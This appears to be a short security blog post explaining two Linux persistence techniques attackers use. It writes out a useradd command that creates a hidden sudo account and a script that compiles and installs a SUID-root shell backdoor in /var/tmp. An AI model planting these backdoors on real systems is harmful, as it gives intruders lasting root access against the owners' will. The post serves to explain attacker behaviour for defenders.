
---
layout: single
title: "Common Linux Persistence Techniques"
excerpt: "The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. "
date: 2021-11-10 00:22:00 -0000
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: 
categories: linux
permalink: /linux/persistence
tags: [linux, persistence]

---

# Common Linux Persistence Techniques


This post will cover a few common linux persistence techniques used by adversary to establish permanent access. The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. 

---
## Creating privilege account

The adversary tends to create a high privilege account to maintain access on the compromised system. They usually create a user with a sudo privilege across the system.

`sudo useradd -p $(openssl passwd -1 $USERPASS) -s /bin/bash -G sudo $USERNAME`
    
## Creating SUID Binary

A binary with its SUID bit set, implying that everything run by the programs will be done with that user's privileges. If the SUID binary is set with root privilege, anyone that run the binary will have access with the root privilege.

	tempdir="/var/tmp"
	echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $tempdir/suid00r.c
	gcc $tempdir/suid00r.c -o $tempdir/suid00r 2>/dev/null
	rm $tempdir/suid00r.c
	chown root:root $tempdir/suid00r
	chmod 4777 $tempdir/suid00r


